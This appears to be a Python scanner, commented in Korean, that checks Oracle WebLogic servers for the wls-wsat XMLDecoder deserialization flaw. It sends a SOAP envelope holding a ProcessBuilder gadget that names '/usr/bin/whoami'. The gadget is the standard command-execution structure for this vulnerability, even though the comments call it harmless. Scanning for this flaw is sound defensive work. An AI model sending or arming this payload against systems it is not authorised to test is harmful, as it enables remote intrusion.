import requests
from requests.exceptions import RequestException

# 타겟 경로 (wls-wsat 컴포넌트의 대표적인 취약 경로)
TARGET_PATH = "/wls-wsat/CoordinatorPortType"

# 취약점 확인을 위한 단순 XML 페이로드 (시스템에 무해한 구조)
CHECK_PAYLOAD = """
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/05/wm/workcontext/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="1">
            <void index="0">
              <string>/usr/bin/whoami</string>
            </void>
          </array>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
"""

def check_vulnerability(url):
    target_url = f"{url.rstrip('/')}{TARGET_PATH}"
    headers = {
        'Content-Type': 'text/xml;charset=UTF-8',
        'User-Agent': 'WebLogic-Scanner-Internal'
    }
    
    try:
        # 10초 타임아웃 설정 (응답 지연 확인용)
        # Verify=False to ignore SSL certificate errors for scanning purposes
        response = requests.post(target_url, data=CHECK_PAYLOAD, headers=headers, timeout=10, verify=False)
        
        # WebLogic 응답 상태 분석
        # 보통 취약한 경우 500 에러와 함께 특정 스택 트레이스가 남거나, 200 OK가 떨어짐
        if response.status_code == 500 and "java.lang.ProcessBuilder" in response.text:
            return True, "VULNERABLE (Response indicates XML parsing success)"
        elif response.status_code == 200:
            return True, "POTENTIALLY VULNERABLE (Endpoint accessible)"
        else:
            return False, f"Not Vulnerable (Status: {response.status_code})"
            
    except RequestException as e:
        return False, f"Connection Failed: {str(e)}"
